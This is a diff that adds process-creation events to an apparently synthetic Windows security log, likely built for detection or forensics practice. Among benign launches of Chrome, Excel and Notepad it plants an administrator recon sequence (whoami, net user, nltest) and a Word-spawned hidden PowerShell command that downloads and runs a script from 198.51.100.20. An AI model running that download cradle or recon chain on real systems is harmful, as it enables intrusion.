@@ -29,6 +29,19 @@ New Logon:
 Network Information:
 	Source Network Address:	10.0.0.34
 "
+Audit Success,2026-03-02 08:40:00,Microsoft-Windows-Security-Auditing,4688,Logon,"A new process has been created.
+
+Creator Subject:
+	Account Name:		mlee
+
+Target Subject:
+	Account Name:		-
+
+Process Information:
+	New Process Name:	C:\Program Files\Google\Chrome\Application\chrome.exe
+	Creator Process Name:	C:\Windows\explorer.exe
+	Process Command Line:	""C:\Program Files\Google\Chrome\Application\chrome.exe""
+"
 Audit Success,2026-03-02 08:40:39,Microsoft-Windows-Security-Auditing,4624,Logon,"An account was successfully logged on.
 
 Subject:
@@ -43,6 +56,32 @@ New Logon:
 
 Network Information:
 	Source Network Address:	10.0.0.46
+"
+Audit Success,2026-03-02 08:42:00,Microsoft-Windows-Security-Auditing,4688,Logon,"A new process has been created.
+
+Creator Subject:
+	Account Name:		mlee
+
+Target Subject:
+	Account Name:		-
+
+Process Information:
+	New Process Name:	C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE
+	Creator Process Name:	C:\Windows\explorer.exe
+	Process Command Line:	""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""
+"
+Audit Success,2026-03-02 08:45:00,Microsoft-Windows-Security-Auditing,4688,Logon,"A new process has been created.
+
+Creator Subject:
+	Account Name:		jdoe
+
+Target Subject:
+	Account Name:		-
+
+Process Information:
+	New Process Name:	C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE
+	Creator Process Name:	C:\Windows\explorer.exe
+	Process Command Line:	""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""
 "
 Audit Success,2026-03-02 08:48:55,Microsoft-Windows-Security-Auditing,4624,Logon,"An account was successfully logged on.
 
@@ -424,6 +463,97 @@ Audit Success,2026-03-02 09:16:56,Microsoft-Windows-Security-Auditing,4672,Logon
 Subject:
 	Account Name:		administrator
 "
+Audit Success,2026-03-02 09:17:00,Microsoft-Windows-Security-Auditing,4688,Logon,"A new process has been created.
+
+Creator Subject:
+	Account Name:		administrator
+
+Target Subject:
+	Account Name:		-
+
+Process Information:
+	New Process Name:	C:\Windows\System32\whoami.exe
+	Creator Process Name:	C:\Windows\System32\cmd.exe
+	Process Command Line:	whoami /all
+"
+Audit Success,2026-03-02 09:17:25,Microsoft-Windows-Security-Auditing,4688,Logon,"A new process has been created.
+
+Creator Subject:
+	Account Name:		administrator
+
+Target Subject:
+	Account Name:		-
+
+Process Information:
+	New Process Name:	C:\Windows\System32\net.exe
+	Creator Process Name:	C:\Windows\System32\cmd.exe
+	Process Command Line:	net user
+"
+Audit Success,2026-03-02 09:17:50,Microsoft-Windows-Security-Auditing,4688,Logon,"A new process has been created.
+
+Creator Subject:
+	Account Name:		administrator
+
+Target Subject:
+	Account Name:		-
+
+Process Information:
+	New Process Name:	C:\Windows\System32\net.exe
+	Creator Process Name:	C:\Windows\System32\cmd.exe
+	Process Command Line:	net localgroup administrators
+"
+Audit Success,2026-03-02 09:18:15,Microsoft-Windows-Security-Auditing,4688,Logon,"A new process has been created.
+
+Creator Subject:
+	Account Name:		administrator
+
+Target Subject:
+	Account Name:		-
+
+Process Information:
+	New Process Name:	C:\Windows\System32\ipconfig.exe
+	Creator Process Name:	C:\Windows\System32\cmd.exe
+	Process Command Line:	ipconfig /all
+"
+Audit Success,2026-03-02 09:18:40,Microsoft-Windows-Security-Auditing,4688,Logon,"A new process has been created.
+
+Creator Subject:
+	Account Name:		administrator
+
+Target Subject:
+	Account Name:		-
+
+Process Information:
+	New Process Name:	C:\Windows\System32\systeminfo.exe
+	Creator Process Name:	C:\Windows\System32\cmd.exe
+	Process Command Line:	systeminfo
+"
+Audit Success,2026-03-02 09:19:05,Microsoft-Windows-Security-Auditing,4688,Logon,"A new process has been created.
+
+Creator Subject:
+	Account Name:		administrator
+
+Target Subject:
+	Account Name:		-
+
+Process Information:
+	New Process Name:	C:\Windows\System32\nltest.exe
+	Creator Process Name:	C:\Windows\System32\cmd.exe
+	Process Command Line:	nltest /domain_trusts
+"
+Audit Success,2026-03-02 09:34:00,Microsoft-Windows-Security-Auditing,4688,Logon,"A new process has been created.
+
+Creator Subject:
+	Account Name:		kpatel
+
+Target Subject:
+	Account Name:		-
+
+Process Information:
+	New Process Name:	C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE
+	Creator Process Name:	C:\Windows\explorer.exe
+	Process Command Line:	""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""
+"
 Audit Success,2026-03-02 09:35:13,Microsoft-Windows-Security-Auditing,4624,Logon,"An account was successfully logged on.
 
 Subject:
@@ -470,6 +600,19 @@ New Logon:
 Network Information:
 	Source Network Address:	10.0.0.25
 "
+Audit Success,2026-03-02 09:50:00,Microsoft-Windows-Security-Auditing,4688,Logon,"A new process has been created.
+
+Creator Subject:
+	Account Name:		kpatel
+
+Target Subject:
+	Account Name:		-
+
+Process Information:
+	New Process Name:	C:\Program Files\Google\Chrome\Application\chrome.exe
+	Creator Process Name:	C:\Windows\explorer.exe
+	Process Command Line:	""C:\Program Files\Google\Chrome\Application\chrome.exe""
+"
 Audit Success,2026-03-02 09:51:15,Microsoft-Windows-Security-Auditing,4624,Logon,"An account was successfully logged on.
 
 Subject:
@@ -484,6 +627,19 @@ New Logon:
 
 Network Information:
 	Source Network Address:	10.0.0.32
+"
+Audit Success,2026-03-02 09:54:00,Microsoft-Windows-Security-Auditing,4688,Logon,"A new process has been created.
+
+Creator Subject:
+	Account Name:		jdoe
+
+Target Subject:
+	Account Name:		-
+
+Process Information:
+	New Process Name:	C:\Windows\System32\notepad.exe
+	Creator Process Name:	C:\Windows\explorer.exe
+	Process Command Line:	""C:\Windows\System32\notepad.exe""
 "
 Audit Success,2026-03-02 09:54:01,Microsoft-Windows-Security-Auditing,4624,Logon,"An account was successfully logged on.
 
@@ -515,6 +671,19 @@ New Logon:
 Network Information:
 	Source Network Address:	10.0.0.68
 "
+Audit Success,2026-03-02 10:13:00,Microsoft-Windows-Security-Auditing,4688,Logon,"A new process has been created.
+
+Creator Subject:
+	Account Name:		mlee
+
+Target Subject:
+	Account Name:		-
+
+Process Information:
+	New Process Name:	C:\Program Files\Google\Chrome\Application\chrome.exe
+	Creator Process Name:	C:\Windows\explorer.exe
+	Process Command Line:	""C:\Program Files\Google\Chrome\Application\chrome.exe""
+"
 Audit Success,2026-03-02 10:15:59,Microsoft-Windows-Security-Auditing,4624,Logon,"An account was successfully logged on.
 
 Subject:
@@ -544,6 +713,71 @@ New Logon:
 
 Network Information:
 	Source Network Address:	10.0.0.76
+"
+Audit Success,2026-03-02 10:30:00,Microsoft-Windows-Security-Auditing,4688,Logon,"A new process has been created.
+
+Creator Subject:
+	Account Name:		jdoe
+
+Target Subject:
+	Account Name:		-
+
+Process Information:
+	New Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+	Creator Process Name:	C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE
+	Process Command Line:	powershell.exe -nop -w hidden -c ""IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.20/a.ps1')""
+"
+Audit Success,2026-03-02 10:30:40,Microsoft-Windows-Security-Auditing,4688,Logon,"A new process has been created.
+
+Creator Subject:
+	Account Name:		jdoe
+
+Target Subject:
+	Account Name:		-
+
+Process Information:
+	New Process Name:	C:\Users\Public\update.exe
+	Creator Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+	Process Command Line:	C:\Users\Public\update.exe
+"
+Audit Success,2026-03-02 10:31:00,Microsoft-Windows-Security-Auditing,4688,Logon,"A new process has been created.
+
+Creator Subject:
+	Account Name:		kpatel
+
+Target Subject:
+	Account Name:		-
+
+Process Information:
+	New Process Name:	C:\Program Files\Google\Chrome\Application\chrome.exe
+	Creator Process Name:	C:\Windows\explorer.exe
+	Process Command Line:	""C:\Program Files\Google\Chrome\Application\chrome.exe""
+"
+Audit Success,2026-03-02 10:32:00,Microsoft-Windows-Security-Auditing,4688,Logon,"A new process has been created.
+
+Creator Subject:
+	Account Name:		rgarcia
+
+Target Subject:
+	Account Name:		-
+
+Process Information:
+	New Process Name:	C:\Program Files\Google\Chrome\Application\chrome.exe
+	Creator Process Name:	C:\Windows\explorer.exe
+	Process Command Line:	""C:\Program Files\Google\Chrome\Application\chrome.exe""
+"
+Audit Success,2026-03-02 10:38:00,Microsoft-Windows-Security-Auditing,4688,Logon,"A new process has been created.
+
+Creator Subject:
+	Account Name:		asmith
+
+Target Subject:
+	Account Name:		-
+
+Process Information:
+	New Process Name:	C:\Program Files\Google\Chrome\Application\chrome.exe
+	Creator Process Name:	C:\Windows\explorer.exe
+	Process Command Line:	""C:\Program Files\Google\Chrome\Application\chrome.exe""
 "
 Audit Success,2026-03-02 10:39:13,Microsoft-Windows-Security-Auditing,4624,Logon,"An account was successfully logged on.
 
@@ -638,6 +872,19 @@ Failure Information:
 Network Information:
 	Source Network Address:	198.51.100.7
 "
+Audit Success,2026-03-02 11:01:00,Microsoft-Windows-Security-Auditing,4688,Logon,"A new process has been created.
+
+Creator Subject:
+	Account Name:		kpatel
+
+Target Subject:
+	Account Name:		-
+
+Process Information:
+	New Process Name:	C:\Program Files\Google\Chrome\Application\chrome.exe
+	Creator Process Name:	C:\Windows\explorer.exe
+	Process Command Line:	""C:\Program Files\Google\Chrome\Application\chrome.exe""
+"
 Audit Failure,2026-03-02 11:01:00,Microsoft-Windows-Security-Auditing,4625,Logon,"An account failed to log on.
 
 Subject:
@@ -718,6 +965,19 @@ Failure Information:
 Network Information:
 	Source Network Address:	198.51.100.7
 "
+Audit Success,2026-03-02 11:03:00,Microsoft-Windows-Security-Auditing,4688,Logon,"A new process has been created.
+
+Creator Subject:
+	Account Name:		mlee
+
+Target Subject:
+	Account Name:		-
+
+Process Information:
+	New Process Name:	C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE
+	Creator Process Name:	C:\Windows\explorer.exe
+	Process Command Line:	""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""
+"
 Audit Success,2026-03-02 11:04:00,Microsoft-Windows-Security-Auditing,4740,Logon,"A user account was locked out.
 
 Subject:
@@ -740,6 +1000,32 @@ New Logon:
 
 Network Information:
 	Source Network Address:	10.0.0.35
+"
+Audit Success,2026-03-02 11:17:00,Microsoft-Windows-Security-Auditing,4688,Logon,"A new process has been created.
+
+Creator Subject:
+	Account Name:		kpatel
+
+Target Subject:
+	Account Name:		-
+
+Process Information:
+	New Process Name:	C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE
+	Creator Process Name:	C:\Windows\explorer.exe
+	Process Command Line:	""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""
+"
+Audit Success,2026-03-02 11:28:00,Microsoft-Windows-Security-Auditing,4688,Logon,"A new process has been created.
+
+Creator Subject:
+	Account Name:		mlee
+
+Target Subject:
+	Account Name:		-
+
+Process Information:
+	New Process Name:	C:\Windows\System32\notepad.exe
+	Creator Process Name:	C:\Windows\explorer.exe
+	Process Command Line:	""C:\Windows\System32\notepad.exe""
 "
 Audit Success,2026-03-02 11:29:42,Microsoft-Windows-Security-Auditing,4624,Logon,"An account was successfully logged on.
 
@@ -770,6 +1056,19 @@ New Logon:
 
 Network Information:
 	Source Network Address:	10.0.0.66
+"
+Audit Success,2026-03-02 11:53:00,Microsoft-Windows-Security-Auditing,4688,Logon,"A new process has been created.
+
+Creator Subject:
+	Account Name:		asmith
+
+Target Subject:
+	Account Name:		-
+
+Process Information:
+	New Process Name:	C:\Program Files\Google\Chrome\Application\chrome.exe
+	Creator Process Name:	C:\Windows\explorer.exe
+	Process Command Line:	""C:\Program Files\Google\Chrome\Application\chrome.exe""
 "
 Audit Success,2026-03-02 11:58:55,Microsoft-Windows-Security-Auditing,4624,Logon,"An account was successfully logged on.
 
@@ -816,6 +1115,32 @@ New Logon:
 Network Information:
 	Source Network Address:	10.0.0.51
 "
+Audit Success,2026-03-02 12:14:00,Microsoft-Windows-Security-Auditing,4688,Logon,"A new process has been created.
+
+Creator Subject:
+	Account Name:		mlee
+
+Target Subject:
+	Account Name:		-
+
+Process Information:
+	New Process Name:	C:\Program Files\Google\Chrome\Application\chrome.exe
+	Creator Process Name:	C:\Windows\explorer.exe
+	Process Command Line:	""C:\Program Files\Google\Chrome\Application\chrome.exe""
+"
+Audit Success,2026-03-02 12:15:00,Microsoft-Windows-Security-Auditing,4688,Logon,"A new process has been created.
+
+Creator Subject:
+	Account Name:		jdoe
+
+Target Subject:
+	Account Name:		-
+
+Process Information:
+	New Process Name:	C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE
+	Creator Process Name:	C:\Windows\explorer.exe
+	Process Command Line:	""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""
+"
 Audit Success,2026-03-02 12:29:32,Microsoft-Windows-Security-Auditing,4624,Logon,"An account was successfully logged on.
 
 Subject:
@@ -830,6 +1155,19 @@ New Logon:
 
 Network Information:
 	Source Network Address:	10.0.0.52
+"
+Audit Success,2026-03-02 12:45:00,Microsoft-Windows-Security-Auditing,4688,Logon,"A new process has been created.
+
+Creator Subject:
+	Account Name:		jdoe
+
+Target Subject:
+	Account Name:		-
+
+Process Information:
+	New Process Name:	C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE
+	Creator Process Name:	C:\Windows\explorer.exe
+	Process Command Line:	""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""
 "
 Audit Success,2026-03-02 13:00:53,Microsoft-Windows-Security-Auditing,4624,Logon,"An account was successfully logged on.
 
@@ -967,6 +1305,19 @@ Audit Success,2026-03-02 13:50:00,Microsoft-Windows-Eventlog,1102,Logon,"The aud
 Subject:
 	Account Name:	administrator
 "
+Audit Success,2026-03-02 14:05:00,Microsoft-Windows-Security-Auditing,4688,Logon,"A new process has been created.
+
+Creator Subject:
+	Account Name:		mlee
+
+Target Subject:
+	Account Name:		-
+
+Process Information:
+	New Process Name:	C:\Windows\System32\ipconfig.exe
+	Creator Process Name:	C:\Windows\System32\cmd.exe
+	Process Command Line:	ipconfig /all
+"
 Audit Success,2026-03-02 14:07:54,Microsoft-Windows-Security-Auditing,4624,Logon,"An account was successfully logged on.
 
 Subject:
@@ -996,6 +1347,19 @@ New Logon:
 
 Network Information:
 	Source Network Address:	10.0.0.42
+"
+Audit Success,2026-03-02 14:18:00,Microsoft-Windows-Security-Auditing,4688,Logon,"A new process has been created.
+
+Creator Subject:
+	Account Name:		rgarcia
+
+Target Subject:
+	Account Name:		-
+
+Process Information:
+	New Process Name:	C:\Windows\System32\notepad.exe
+	Creator Process Name:	C:\Windows\explorer.exe
+	Process Command Line:	""C:\Windows\System32\notepad.exe""
 "
 Audit Success,2026-03-02 14:18:18,Microsoft-Windows-Security-Auditing,4624,Logon,"An account was successfully logged on.
 
@@ -1118,6 +1482,19 @@ New Logon:
 Network Information:
 	Source Network Address:	10.0.0.44
 "
+Audit Success,2026-03-02 15:17:00,Microsoft-Windows-Security-Auditing,4688,Logon,"A new process has been created.
+
+Creator Subject:
+	Account Name:		rgarcia
+
+Target Subject:
+	Account Name:		-
+
+Process Information:
+	New Process Name:	C:\Program Files\Google\Chrome\Application\chrome.exe
+	Creator Process Name:	C:\Windows\explorer.exe
+	Process Command Line:	""C:\Program Files\Google\Chrome\Application\chrome.exe""
+"
 Audit Success,2026-03-02 15:21:22,Microsoft-Windows-Security-Auditing,4624,Logon,"An account was successfully logged on.
 
 Subject:
@@ -1132,6 +1509,19 @@ New Logon:
 
 Network Information:
 	Source Network Address:	10.0.0.46
+"
+Audit Success,2026-03-02 15:32:00,Microsoft-Windows-Security-Auditing,4688,Logon,"A new process has been created.
+
+Creator Subject:
+	Account Name:		rgarcia
+
+Target Subject:
+	Account Name:		-
+
+Process Information:
+	New Process Name:	C:\Windows\System32\notepad.exe
+	Creator Process Name:	C:\Windows\explorer.exe
+	Process Command Line:	""C:\Windows\System32\notepad.exe""
 "
 Audit Failure,2026-03-02 15:50:29,Microsoft-Windows-Security-Auditing,4625,Logon,"An account failed to log on.
 
@@ -1164,6 +1554,19 @@ New Logon:
 Network Information:
 	Source Network Address:	10.0.0.79
 "
+Audit Success,2026-03-02 15:51:00,Microsoft-Windows-Security-Auditing,4688,Logon,"A new process has been created.
+
+Creator Subject:
+	Account Name:		mlee
+
+Target Subject:
+	Account Name:		-
+
+Process Information:
+	New Process Name:	C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE
+	Creator Process Name:	C:\Windows\explorer.exe
+	Process Command Line:	""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""
+"
 Audit Success,2026-03-02 15:59:33,Microsoft-Windows-Security-Auditing,4624,Logon,"An account was successfully logged on.
 
 Subject:
@@ -1178,6 +1581,19 @@ New Logon:
 
 Network Information:
 	Source Network Address:	10.0.0.55
+"
+Audit Success,2026-03-02 16:01:00,Microsoft-Windows-Security-Auditing,4688,Logon,"A new process has been created.
+
+Creator Subject:
+	Account Name:		asmith
+
+Target Subject:
+	Account Name:		-
+
+Process Information:
+	New Process Name:	C:\Program Files\Google\Chrome\Application\chrome.exe
+	Creator Process Name:	C:\Windows\explorer.exe
+	Process Command Line:	""C:\Program Files\Google\Chrome\Application\chrome.exe""
 "
 Audit Success,2026-03-02 16:04:51,Microsoft-Windows-Security-Auditing,4624,Logon,"An account was successfully logged on.
 
@@ -1223,6 +1639,19 @@ New Logon:
 
 Network Information:
 	Source Network Address:	10.0.0.68
+"
+Audit Success,2026-03-02 16:20:00,Microsoft-Windows-Security-Auditing,4688,Logon,"A new process has been created.
+
+Creator Subject:
+	Account Name:		mlee
+
+Target Subject:
+	Account Name:		-
+
+Process Information:
+	New Process Name:	C:\Program Files\Google\Chrome\Application\chrome.exe
+	Creator Process Name:	C:\Windows\explorer.exe
+	Process Command Line:	""C:\Program Files\Google\Chrome\Application\chrome.exe""
 "
 Audit Success,2026-03-02 16:20:01,Microsoft-Windows-Security-Auditing,4624,Logon,"An account was successfully logged on.
 
@@ -1343,6 +1772,19 @@ New Logon:
 
 Network Information:
 	Source Network Address:	10.0.0.29
+"
+Audit Success,2026-03-02 17:33:00,Microsoft-Windows-Security-Auditing,4688,Logon,"A new process has been created.
+
+Creator Subject:
+	Account Name:		kpatel
+
+Target Subject:
+	Account Name:		-
+
+Process Information:
+	New Process Name:	C:\Windows\System32\notepad.exe
+	Creator Process Name:	C:\Windows\explorer.exe
+	Process Command Line:	""C:\Windows\System32\notepad.exe""
 "
 Audit Success,2026-03-02 17:34:34,Microsoft-Windows-Security-Auditing,4624,Logon,"An account was successfully logged on.
 
